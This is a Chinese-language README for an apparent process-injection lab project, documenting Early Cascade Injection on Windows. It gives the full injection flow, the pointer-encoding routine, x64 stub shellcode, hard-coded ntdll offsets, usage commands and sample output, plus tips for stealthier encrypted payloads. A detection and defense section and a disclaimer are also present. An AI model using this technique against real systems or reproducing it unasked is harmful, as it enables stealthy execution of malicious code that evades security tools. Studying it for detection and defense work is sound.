# Early Cascade Injection

## 概述

**Early Cascade Injection** 是一种利用 Windows Shim Engine 机制在进程启动早期执行代码的注入技术。该技术由 Outflank 团队于 2024年10月首次公开，通过劫持 ntdll.dll 中的 DLL 加载回调实现隐蔽注入。

**原始项目**: [Cracked5pider/earlycascade-injection](https://github.com/Cracked5pider/earlycascade-injection)

**技术文章**: [Outflank - Introducing Early Cascade Injection](https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/)

## 技术原理

### 核心思想

Windows 进程在启动时会经历复杂的初始化流程，其中包括 Shim Engine（应用程序兼容性系统）的处理。ntdll.dll 中维护了两个全局变量：

```c
// .data 节
BYTE g_ShimsEnabled;  // 控制 shim 引擎是否启用

// .mrdata 节（只读数据，但可以远程写入）
PVOID g_pfnSE_DllLoaded;  // DLL 加载时的回调函数指针（编码过的）
```

**工作机制**：
1. 当 `g_ShimsEnabled = TRUE` 时，进程加载每个 DLL 都会触发回调
2. 系统会解码 `g_pfnSE_DllLoaded` 指针并调用
3. 我们可以设置这个指针指向我们的 shellcode
4. 第一个 DLL 加载时，我们的代码就会执行

### 与其他技术的对比

| 技术 | 执行时机 | 优点 | 缺点 |
|------|---------|------|------|
| Early Bird APC | 主线程初始化前 | 较早执行 | 需要调试权限 |
| Entry Point Injection | 入口点执行时 | 简单直接 | 执行较晚 |
| **Early Cascade** | 第一个 DLL 加载时 | 非常早期执行 | 依赖特定 Windows 机制 |

### 技术流程

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 创建挂起的目标进程                                           │
│    CreateProcess(..., CREATE_SUSPENDED, ...)                   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 分配远程内存                                                 │
│    VirtualAllocEx(..., stub_size + payload_size, ...)          │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 准备 Stub Shellcode                                          │
│    功能：                                                       │
│    - 禁用 shim 引擎（g_ShimsEnabled = FALSE）                   │
│    - 使用 NtQueueApcThread 队列 payload                         │
│    - Payload 在 LdrInitializeThunk 结束时执行                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 写入 Stub 和 Payload                                         │
│    WriteProcessMemory(stub)                                     │
│    WriteProcessMemory(payload)                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. 启用 Shim Engine                                             │
│    g_ShimsEnabled = TRUE                                        │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. 设置 DLL 加载回调                                            │
│    encodedPtr = EncodePointer(stub)                             │
│    g_pfnSE_DllLoaded = encodedPtr                               │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. 恢复进程执行                                                 │
│    ResumeThread(...)                                            │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 8. 进程加载第一个 DLL                                           │
│    系统调用 g_pfnSE_DllLoaded（我们的 stub）                    │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 9. Stub 执行                                                    │
│    - g_ShimsEnabled = FALSE  （防止后续调用）                   │
│    - NtQueueApcThread(payload)                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 10. Payload 执行                                                │
│     在 LdrInitializeThunk 结束时触发 APC                        │
└─────────────────────────────────────────────────────────────────┘
```

## 关键技术细节

### 1. 指针编码（Pointer Encoding）

Windows 使用指针编码来防止指针被篡改。编码算法：

```c
PVOID EncodePointer(PVOID ptr) {
    ULONG cookie = *(ULONG*)0x7FFE0330;  // SharedUserData->Cookie
    ULONG_PTR encoded = cookie ^ (ULONG_PTR)ptr;

    // 循环右移
    ULONG shift = cookie & 0x3F;
    encoded = (encoded >> shift) | (encoded << (64 - shift));

    return (PVOID)encoded;
}
```

**为什么使用编码**：
- 防止简单的指针覆盖攻击
- 增加利用难度
- 但我们可以使用相同算法编码我们的指针

### 2. SharedUserData 结构

```c
// 固定地址：0x7FFE0000（所有进程共享）
typedef struct _KUSER_SHARED_DATA {
    // ...
    ULONG Cookie;  // Offset: 0x330
    // ...
} KUSER_SHARED_DATA;
```

**特点**：
- 所有进程共享同一个 Cookie 值
- 地址固定，可直接访问
- 父子进程的 Cookie 相同

### 3. Stub Shellcode 结构

```asm
sub rsp, 0x38              ; 分配栈空间
xor eax, eax               ; EAX = 0
xor r9d, r9d               ; R9 = 0 (第4个参数)
and [rsp+0x18], rax        ; 清空栈

; 设置参数
mov rdx, <payload_addr>    ; RDX = payload 地址（第2个参数）
mov ds:<g_ShimsEnabled>, al ; 禁用 shim 引擎
mov r8, <context_addr>     ; R8 = context 地址（第3个参数）
lea rcx, [rax-2]           ; RCX = -2（NtCurrentThread()）

; 调用 NtQueueApcThread
mov rax, <NtQueueApcThread_addr>
call rax

xor eax, eax               ; 返回值 = 0
add rsp, 0x38              ; 恢复栈
ret
```

**关键点**：
1. `g_ShimsEnabled` 必须立即设为 FALSE（防止后续 DLL 加载触发）
2. 使用 `NtQueueApcThread` 队列 APC 而不是直接执行
3. APC 会在 `LdrInitializeThunk` 结束时自动触发

### 4. 硬编码偏移

```c
// 这些偏移特定于 Windows 版本
PVOID g_ShimsEnabled = secData + 0x6cf0;      // .data 节偏移
PVOID g_pfnSE_DllLoaded = secMrdata + 0x270;  // .mrdata 节偏移
```

**注意**：
- 不同 Windows 版本偏移可能不同
- 需要针对目标版本调整
- 可以通过符号文件或逆向工程确定

### 5. 为什么使用 APC？

Stub 不直接执行 payload，而是通过 APC 队列，原因：

1. **时机控制**：
   - APC 在 `LdrInitializeThunk` 结束时执行
   - 此时进程已完全初始化，所有 API 可用

2. **稳定性**：
   - DLL 加载回调中不适合执行复杂代码
   - 直接执行可能导致死锁或崩溃

3. **隐蔽性**：
   - APC 是正常的系统机制
   - 比直接跳转更不容易被检测

## 项目结构

```
09-early-cascade/
├── README.md                    # 本文档
├── build.sh                     # Linux/macOS 构建脚本
├── build.bat                    # Windows 构建脚本
├── src/
│   ├── early_cascade.c          # 主注入器
│   └── generate_shellcode.c     # Shellcode 生成器
└── build/
    ├── early_cascade.exe        # 主程序
    ├── generate_shellcode.exe   # Shellcode 工具
    └── payload.bin              # 测试载荷
```

## 构建和使用

### 前置要求

- **编译器**: GCC (MinGW-w64)
- **架构**: x64 only
- **系统**: Windows 10/11

### 构建步骤

```bash
# Windows
build.bat

# Linux/macOS (需要 MinGW 交叉编译)
bash build.sh
```

### 使用方法

```bash
cd build

# 基本用法
early_cascade.exe "C:\Windows\System32\notepad.exe" payload.bin

# 生成自定义 payload
generate_shellcode.exe my_payload.bin
early_cascade.exe "C:\Windows\System32\calc.exe" my_payload.bin
```

### 输出示例

```
===================================================================
Early Cascade Injection
===================================================================

[*] Target Process: C:\Windows\System32\notepad.exe
[*] Payload Size: 19 bytes
[+] Payload loaded: 19 bytes

[*] Step 1: Creating suspended process...
[+] Process created (PID: 12345)

[*] Step 2: Allocating remote memory...
[+] Remote memory allocated at: 0x00000123456789AB

[*] Step 3: Resolving ntdll.dll addresses...
[+] g_ShimsEnabled   : 0x00007FFB12345678
[+] g_pfnSE_DllLoaded: 0x00007FFB12345ABC

[*] Step 4: Preparing stub shellcode...
[+] Stub prepared with patched addresses

[*] Step 5: Writing stub and payload...
[+] Stub written (67 bytes)
[+] Payload written (19 bytes)

[*] Step 6: Enabling Shim Engine...
[+] g_ShimsEnabled set to TRUE

[*] Step 7: Setting DLL load callback...
[+] g_pfnSE_DllLoaded set to encoded stub address

[*] Step 8: Resuming process...
[+] Process resumed

===================================================================
[+] Early Cascade injection completed!
===================================================================
```

## 技术限制

### 1. Windows 版本依赖

- **硬编码偏移**：`g_ShimsEnabled` 和 `g_pfnSE_DllLoaded` 的偏移因版本而异
- **Shim Engine 变化**：未来 Windows 版本可能修改机制
- **兼容性**：仅在特定 Windows 版本测试（参考项目在 Windows 10 22631.4317）

### 2. 架构限制

- **x64 Only**：Stub shellcode 使用 x64 指令
- **x86 支持**：需要重写 stub 和修改偏移

### 3. 时序要求

- **必须在进程恢复前设置**：所有 patch 必须在 `ResumeThread` 前完成
- **第一个 DLL**：只在第一个 DLL 加载时触发一次
- **禁用后不可恢复**：Stub 执行后 shim 引擎被永久禁用

### 4. Payload 限制

- **必须是 PIC**：Payload 可能被加载到任意地址
- **API 依赖**：执行时 ntdll.dll 已加载，但其他 DLL 可能未加载
- **大小限制**：理论上无限制，但过大可能引起怀疑

## 检测与防御

### 检测方法

1. **Shim Engine 监控**
   ```
   检测点：g_ShimsEnabled 被意外设置为 TRUE
   风险：可能是注入攻击
   ```

2. **内存完整性检查**
   ```
   检测点：g_pfnSE_DllLoaded 指针异常
   正常：NULL 或系统函数
   异常：指向非法内存区域
   ```

3. **行为监控**
   ```
   可疑行为：
   - 创建挂起进程
   - 远程内存写入到 ntdll.dll 数据节
   - 修改只读内存区域（.mrdata）
   ```

4. **ETW 事件跟踪**
   ```
   Microsoft-Windows-Kernel-Process
   - ProcessCreate (CREATE_SUSPENDED)
   - RemoteMemoryWrite
   ```

### 防御建议

**对于 EDR/AV**：
- 监控 `g_ShimsEnabled` 和 `g_pfnSE_DllLoaded` 的修改
- 检测跨进程内存写入到 ntdll.dll
- 验证 shim 回调指针的合法性

**对于管理员**：
- 启用 HVCI (Hypervisor-Enforced Code Integrity)
- 使用 CFG (Control Flow Guard)
- 应用最新安全补丁

**对于开发者**：
- 避免创建挂起进程（如无必要）
- 使用 Process Mitigation Policies
- 启用 ASLR 和 DEP

## 改进方向

### 1. 动态偏移解析

```c
// 不使用硬编码，而是通过符号或模式搜索
PVOID FindG_ShimsEnabled() {
    // 搜索 .data 节中的特征字节序列
    // 或使用公开的符号信息
}
```

### 2. 多版本支持

```c
typedef struct {
    DWORD BuildNumber;
    DWORD G_ShimsEnabled_Offset;
    DWORD G_pfnSE_DllLoaded_Offset;
} VERSION_OFFSETS;

VERSION_OFFSETS offsets[] = {
    { 22631, 0x6cf0, 0x270 },  // Windows 11 22H2
    { 22621, 0x6cf0, 0x270 },  // Windows 11
    // ...
};
```

### 3. 更隐蔽的 Payload

```c
// 使用 PIC + API 动态解析（类似 Ruy-Lopez）
// 避免硬编码 API 地址
// 加密 shellcode，运行时解密
```

## 参考资料

### 技术文章

- [Outflank - Introducing Early Cascade Injection](https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/)
- [MalwareTech - Bypassing EDRs with EDR Preload](https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html)

### 原始项目

- [Cracked5pider/earlycascade-injection](https://github.com/Cracked5pider/earlycascade-injection)

### 相关技术

- [Early Bird APC Injection](../06-early-bird-apc/)
- [Entry Point Injection](../07-entry-point-injection/)
- [Ruy-Lopez DLL Blocking](../08-dll-blocking/)

### Windows 内部机制

- [Windows Shim Engine](https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-shims)
- [Process Environment Block (PEB)](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
- [SharedUserData Structure](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi_x/kuser_shared_data/)

## Credits

- **Outflank Team** - 技术发现和文档
- **Cracked5pider** - PoC 实现
- **MalwareTech** - 指针编码研究

## 免责声明

此代码仅用于教育和防御性安全研究目的。不得用于未经授权的系统访问或恶意活动。使用者需对自己的行为负责。
